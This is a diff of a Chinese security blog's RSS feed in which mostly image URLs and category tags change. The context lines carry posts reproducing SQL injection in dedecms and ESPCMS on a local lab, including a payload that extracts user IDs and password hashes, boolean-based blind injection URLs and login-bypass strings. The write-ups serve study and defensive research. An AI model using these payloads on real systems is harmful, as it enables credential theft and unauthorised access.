@@ -9,13 +9,13 @@
         <lastBuildDate>Tue, 30 Nov 2021 21:11:00 +0800</lastBuildDate>
         <category>tip</category>
         <category>安装</category>
-        <category>re</category>
-        <category>工具</category>
         <category>linux</category>
-        <category>windows</category>
         <category>web</category>
         <category>wp</category>
         <category>攻防世界</category>
+        <category>re</category>
+        <category>工具</category>
+        <category>windows</category>
         <category>BUUCTF</category>
         <category>server</category>
         <category>bug</category>
@@ -41,7 +41,7 @@
             <pubDate>Tue, 30 Nov 2021 21:11:00 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;dedecms二次注入漏洞&#34;&gt;&lt;a href=&#34;#dedecms二次注入漏洞&#34; class=&#34;headerlink&#34; title=&#34;dedecms二次注入漏洞&#34;&gt;&lt;/a&gt;dedecms二次注入漏洞&lt;/h1&gt;&lt;h2 id=&#34;安装&#34;&gt;&lt;a href=&#34;#安装&#34; class=&#34;headerlink&#34; title=&#34;安装&#34;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;首先搭建环境，注意php版本不要大于5.3，安装完后删除install文件夹&lt;/p&gt;
 &lt;p&gt;进入主页是这样的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/30/o3T8r6.png&#34; alt=&#34;o3T8r6.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/a72c0587bfe3f74f402b1314c92e3107.png&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;分析&#34;&gt;&lt;a href=&#34;#分析&#34; class=&#34;headerlink&#34; title=&#34;分析&#34;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;漏洞点在&lt;code&gt;\dedecms\plus\feedback.php&lt;/code&gt;&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;//保存评论内容&lt;/span&gt;
 	&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$comtype&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;comments&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
@@ -79,11 +79,11 @@
 &lt;p&gt;&lt;code&gt;$arctitle = $row[&#39;arctitle&#39;];&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;这两句代码将id为fid的评论的读取出来，并将之前保存的标题赋值给arctitle，然后再将这个值插入数据库中，这时插入的值是没有经过addslashes转义的，这就导致了二次注入&lt;/p&gt;
 &lt;h2 id=&#34;操作&#34;&gt;&lt;a href=&#34;#操作&#34; class=&#34;headerlink&#34; title=&#34;操作&#34;&gt;&lt;/a&gt;操作&lt;/h2&gt;&lt;p&gt;先用管理员账号新增一个栏目用来发表文章dedecms/dede/&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/30/o3TtaD.png&#34; alt=&#34;o3TtaD.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/2ee04dc00404e80bc7030a47fd2728e5.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;注册一个普通用户用来做测试对象&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/30/o3TgIg.png&#34; alt=&#34;o3TgIg.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/39d4e1964304da5688416a73e8538e61.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;进入主页随便发布一篇文章&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/30/o3TWGj.png&#34; alt=&#34;o3TWGj.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/9280b647ce4c8b5b9d7da0dbf1bafd37.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;第一次注入&lt;/p&gt;
 &lt;p&gt;根据代码构造payload&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;get  http:&lt;span class=&#34;token comment&#34;&gt;//dedecms/plus/feedback.php?aid=1&lt;/span&gt;
@@ -92,10 +92,10 @@ post  &lt;span class=&#34;token keyword&#34;&gt;action&lt;/span&gt;&lt;span clas
 
 &lt;p&gt;aid为文章ID号，action为处理方式，comtype为操作方式，vaildate为验证码，也能注释掉方便测试，title未标题，构建payload的地方，其他参数审计得到&lt;/p&gt;
 &lt;p&gt;注释验证码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/30/o37sp9.png&#34; alt=&#34;o37sp9.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/146b7de895917c4e4086cd4707925e9a.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;执行注入就会发表一条评论，可以看到注入单引号被转义了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/30/o3TXW9.png&#34; alt=&#34;o3TXW9.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/30/o37PoD.png&#34; alt=&#34;o37PoD.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/219fb762991726610f47e58e92b613b8.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/b2b61c5c5cbcc9b89a5a1c42fbfb882c.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;第二次注入&lt;/p&gt;
 &lt;p&gt;在第一条评论上注入&lt;/p&gt;
 &lt;p&gt;fid为评论的ID号&lt;/p&gt;
@@ -103,12 +103,12 @@ post  &lt;span class=&#34;token keyword&#34;&gt;action&lt;/span&gt;&lt;span clas
 
 post  &lt;span class=&#34;token keyword&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;send&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;comtype&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;reply&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;fid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;isconfirm&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;yes&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;validate&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;xx&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;msg&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;userid&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x3a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;pwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;xxxxx_member&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/30/o37VSA.png&#34; alt=&#34;o37VSA.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/30/o37Yyq.png&#34; alt=&#34;o37Yyq.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/d554ba1d0411ed7e7d75dd7b518d86bc.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/838befebdd5c5dccd8ecdae24f1a6fb9.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;这里可以证实读取出来的acrtitle是没有转义的，再和msg拼接就造成了恶意sql代码的执行，并且把执行结果暴露出来了&lt;/p&gt;
 &lt;p&gt;至此复现成功&lt;/p&gt;
 &lt;p&gt;这里贴一下后台的数据库&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/30/o37dTU.png&#34; alt=&#34;o37dTU.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/e31b87f57662165e6b344e557bcabaec.png&#34;&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -127,7 +127,7 @@ post  &lt;span class=&#34;token keyword&#34;&gt;action&lt;/span&gt;&lt;span clas
 &lt;p&gt;代码审计的时候可以通过搜索这两个函数&lt;code&gt;urldecode&lt;/code&gt;或者&lt;code&gt;rawurldecode&lt;/code&gt;来寻找漏洞&lt;/p&gt;
 &lt;h2 id=&#34;操作演示&#34;&gt;&lt;a href=&#34;#操作演示&#34; class=&#34;headerlink&#34; title=&#34;操作演示&#34;&gt;&lt;/a&gt;操作演示&lt;/h2&gt;&lt;p&gt;先搭建环境，进入首页，配置好数据库及其他配置&lt;/p&gt;
 &lt;p&gt;漏洞在&lt;code&gt;interface/search.php&lt;/code&gt;文件和&lt;code&gt;interface/3gwap_search.php&lt;/code&gt;文件&lt;code&gt;in_taglist()&lt;/code&gt;函数&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/25/oAD734.png&#34; alt=&#34;oAD734.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/59195d643c2222e1700406d1010483c0.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;可以看到一个搜索框和两个参数，审计代码&lt;/p&gt;
 &lt;p&gt;代码中有三个函数，&lt;code&gt;in_list(),in_result(),in_taglist()&lt;/code&gt;，第二函数应该是调用函数，阅读代码得到第三个参数是tagkey&lt;/p&gt;
 &lt;p&gt;函数代码&lt;/p&gt;
@@ -202,11 +202,11 @@ post  &lt;span class=&#34;token keyword&#34;&gt;action&lt;/span&gt;&lt;span clas
 &lt;span class=&#34;token variable&#34;&gt;$rs&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;创建并且执行sql语句，可以看到中间并没有其他的手段&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/25/oADOD1.png&#34; alt=&#34;oADOD1.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/e9cb89dac59d7cb4a2030af0d3f947be.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;在如图添加一条回显，方便调试&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/25/oADXHx.png&#34; alt=&#34;oADXHx.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/22db695e34dfe109a22d0f070b6d83a9.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;可以看到单引号被转义了，这时利用&lt;code&gt;urldecode()&lt;/code&gt;的特性，报错存在注入&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/25/oArpCD.png&#34; alt=&#34;oArpCD.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/dcbb61fbf9e911eed98d38a406c7a466.png&#34;&gt;&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$db_where&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39; WHERE lng=\&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$lng&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;\&#39; AND isclass=1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
 &lt;span class=&#34;token variable&#34;&gt;$db_where&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34; AND FIND_IN_SET(&#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$tagkey&lt;/span&gt;&lt;/span&gt;&#39;,tags)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
@@ -214,7 +214,7 @@ post  &lt;span class=&#34;token keyword&#34;&gt;action&lt;/span&gt;&lt;span clas
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//localhost/espcms/index.php?ac=search&amp;amp;at=taglist&amp;amp;tagkey=1%2527,tags) or 1=1 %23&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;返回结果为真&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/25/oArFKA.png&#34; alt=&#34;oArFKA.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/c8bc7735d13bbba8b53d3fdb90b0e277.png&#34;&gt;&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//localhost/espcms/index.php?ac=search&amp;amp;at=taglist&amp;amp;tagkey=1%2527,tags) or 1=2 %23&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;返回结果为假&lt;img src=&#34;https://z3.ax1x.com/2021/11/25/oArAbt.png&#34; alt=&#34;oArAbt.png&#34;&gt;&lt;/p&gt;
@@ -222,7 +222,7 @@ post  &lt;span class=&#34;token keyword&#34;&gt;action&lt;/span&gt;&lt;span clas
 &lt;p&gt;测试注入数据库长度&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//localhost/espcms/index.php?ac=search&amp;amp;at=taglist&amp;amp;tagkey=1%2527,tags) or (seleselectct length(database())=9)  %23&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/11/25/oAre58.png&#34; alt=&#34;oAre58.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/31d5b56cb336e7a83ab881317b023504.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;相符合，其他的用脚本就能跑出来&lt;/p&gt;
 &lt;h2 id=&#34;脚本演示&#34;&gt;&lt;a href=&#34;#脚本演示&#34; class=&#34;headerlink&#34; title=&#34;脚本演示&#34;&gt;&lt;/a&gt;脚本演示&lt;/h2&gt;&lt;h3 id=&#34;爆数据库长度&#34;&gt;&lt;a href=&#34;#爆数据库长度&#34; class=&#34;headerlink&#34; title=&#34;爆数据库长度&#34;&gt;&lt;/a&gt;爆数据库长度&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests
 
@@ -374,9 +374,9 @@ key_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span clas
             <category>学习</category>
             <pubDate>Mon, 19 Jul 2021 09:25:00 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;SQL注入学习&#34;&gt;&lt;a href=&#34;#SQL注入学习&#34; class=&#34;headerlink&#34; title=&#34;SQL注入学习&#34;&gt;&lt;/a&gt;SQL注入学习&lt;/h1&gt;&lt;h2 id=&#34;原理&#34;&gt;&lt;a href=&#34;#原理&#34; class=&#34;headerlink&#34; title=&#34;原理&#34;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;h3 id=&#34;数据库与web交互&#34;&gt;&lt;a href=&#34;#数据库与web交互&#34; class=&#34;headerlink&#34; title=&#34;数据库与web交互&#34;&gt;&lt;/a&gt;数据库与web交互&lt;/h3&gt;&lt;p&gt;数据库驱动的Web应用通常包含三层：表示层、逻辑层和存储层&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/04/21/cbHpa4.png&#34; alt=&#34;cbHpa4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/bd917bb464f4ecc0a70931647924489c.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Web浏览器（表示层）向中间层（逻辑层）发送请求，后者依次调用由位于应用层 的应用服务器提供的API，应用层通过查询、更新数据库（存储层）来响应该请求。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJgYwQ.png&#34; alt=&#34;WJgYwQ.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/fb4fe488ca6064bb837f649984e43f12.png&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;SQL注入的产生过程&#34;&gt;&lt;a href=&#34;#SQL注入的产生过程&#34; class=&#34;headerlink&#34; title=&#34;SQL注入的产生过程&#34;&gt;&lt;/a&gt;&lt;strong&gt;SQL&lt;/strong&gt;注入的产生过程&lt;/h3&gt;&lt;h4 id=&#34;构造动态字符串&#34;&gt;&lt;a href=&#34;#构造动态字符串&#34; class=&#34;headerlink&#34; title=&#34;构造动态字符串&#34;&gt;&lt;/a&gt;构造动态字符串&lt;/h4&gt;&lt;p&gt;简单来说就是将得到参数拼接到查询语句，然后执行，下列不当将会导致SQL注入&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; FIELD &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;input&#39;&lt;/span&gt;
 
@@ -452,7 +452,7 @@ http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.php
 http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.php?category=bikes&lt;/span&gt;
 http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproducts.php?category=bi&#39;&#39;kes&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
-&lt;h5 id=&#34;信息工作流&#34;&gt;&lt;a href=&#34;#信息工作流&#34; class=&#34;headerlink&#34; title=&#34;信息工作流&#34;&gt;&lt;/a&gt;信息工作流&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJ2Fts.png&#34; alt=&#34;WJ2Fts.png&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;信息工作流&#34;&gt;&lt;a href=&#34;#信息工作流&#34; class=&#34;headerlink&#34; title=&#34;信息工作流&#34;&gt;&lt;/a&gt;信息工作流&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/264b07c0f1804dc008b15f081b391718.png&#34;&gt;&lt;/p&gt;
 &lt;h4 id=&#34;数据库错误&#34;&gt;&lt;a href=&#34;#数据库错误&#34; class=&#34;headerlink&#34; title=&#34;数据库错误&#34;&gt;&lt;/a&gt;数据库错误&lt;/h4&gt;&lt;p&gt;就是上文提到的报错&lt;/p&gt;
 &lt;h5 id=&#34;常见的sql漏洞&#34;&gt;&lt;a href=&#34;#常见的sql漏洞&#34; class=&#34;headerlink&#34; title=&#34;常见的sql漏洞&#34;&gt;&lt;/a&gt;常见的sql漏洞&lt;/h5&gt;&lt;h6 id=&#34;Sql-Server错误&#34;&gt;&lt;a href=&#34;#Sql-Server错误&#34; class=&#34;headerlink&#34; title=&#34;Sql Server错误&#34;&gt;&lt;/a&gt;Sql Server错误&lt;/h6&gt;&lt;p&gt;假设在victim.com应用中找到了一个名为showproducts.php的页面，页面脚本接收名为id 的参数并根据id参数的值显示单个商品：&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproduct.aspx?id=2&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
@@ -680,7 +680,7 @@ http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproduct.php?
 
 &lt;h4 id=&#34;内联SQL注入&#34;&gt;&lt;a href=&#34;#内联SQL注入&#34; class=&#34;headerlink&#34; title=&#34;内联SQL注入&#34;&gt;&lt;/a&gt;内联SQL注入&lt;/h4&gt;&lt;p&gt;内联注入是指向查询注入一些SQL代码后，原来的代码仍然会全部执行&lt;/p&gt;
 &lt;h5 id=&#34;字符串内联注入&#34;&gt;&lt;a href=&#34;#字符串内联注入&#34; class=&#34;headerlink&#34; title=&#34;字符串内联注入&#34;&gt;&lt;/a&gt;字符串内联注入&lt;/h5&gt;&lt;p&gt;实例——用户提交用户和口令发送到数据库查询对用户进行验证&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJ2Jc6.png&#34; alt=&#34;WJ2Jc6.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/890687249876e3832a2b2b96b5398fe6.png&#34;&gt;&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;查询语句
 &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;$uname&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;$passwd&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;LIMIT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
@@ -694,7 +694,7 @@ http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproduct.php?
 &lt;p&gt;所以改变payload&lt;code&gt;&#39; or 1=1 or &#39;1&#39;=&#39;1&lt;/code&gt; &lt;/p&gt;
 &lt;p&gt;当只允许返回一行时，指定返回admin &lt;code&gt;&#39;admin&#39; and 1=1 or &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;在passwd字段注入，&lt;code&gt;&#39;or &#39;1&#39;=&#39;1&lt;/code&gt;返回所有行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJ2wAH.png&#34; alt=&#34;WJ2wAH.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/6fd62d2c5717e94dd7bcba0e4342e9d9.png&#34;&gt;&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;UPDATE&lt;/span&gt; users
